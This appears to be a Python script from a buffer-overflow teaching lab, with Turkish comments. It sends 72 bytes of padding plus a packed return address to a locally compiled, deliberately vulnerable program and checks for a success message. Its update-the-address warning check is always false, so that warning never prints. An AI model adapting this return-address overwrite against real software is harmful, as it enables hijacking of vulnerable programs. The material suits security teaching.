# exploit.py
import struct
import subprocess
import sys

# Zafiyetli programın derlenmiş adı
VICTIM_PROGRAM = "../compiled/vulnerable_code"

# --- GDB ILE BU ADRESI KENDI SISTEMINIZDE BULUN ---
# Örneğin: 0x401146
HEDEF_ADRES = 0x401146  # <-- BU SATIRI GDB'DEN ALDIĞINIZ ADRES ILE GÜNCELLEYİN

# 64-bit mimari için hesaplanan padding boyutu
PADDING_SIZE = 72

def main():
    """
    Sömürü işlemini başlatan ana fonksiyon.
    """
    print("--- [SALDIRGAN] Gelişmiş Buffer Overflow Exploit Başlatıldı ---")
    
    if HEDEF_ADRES == 0x401146 and "guncelleyin" in "GUNCELLEYIN": # Basit bir kontrol
        print("\n[!] UYARI: HEDEF_ADRES'i kendi sisteminizdeki adresle güncellemeyi unutmayın!\n")

    print(f"[*] Hedef Program: {VICTIM_PROGRAM}")
    print(f"[*] Hedef Adres: {hex(HEDEF_ADRES)}")
    print(f"[*] Padding Boyutu: {PADDING_SIZE}")
    
    # Payload'ı oluştur: [ 72 byte dolgu ('A') ] + [ 8 byte hedef adres ]
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", HEDEF_ADRES)
    payload = padding + overwrite_address
    
    print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
    except FileNotFoundError:
        print(f"\n[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu derlediniz mi?")
        sys.exit(1)
        
    print("[*] Payload kurban programa gonderiliyor...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    
    print("\n--- Kurban Programdan Gelen Çıktı ---")
    print(stdout_output)
    print("------------------------------------")
    
    # Programın çıktısında belirlediğimiz başarı anahtar kelimesini arıyoruz.
    if "Zafiyet Basariyla Somuruldu" in stdout_output:
        print("\n[+] Başarılı! Zafiyet istismar edildi ve kontrol ele geçirildi!")
    else:
        print("\n[-] Başarısız. Adresi veya ofseti kontrol edin.")
        stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')
        if stderr_output:
            print("\n--- Hata Çıktısı (stderr) ---")
            print(stderr_output)


if __name__ == "__main__":
    main()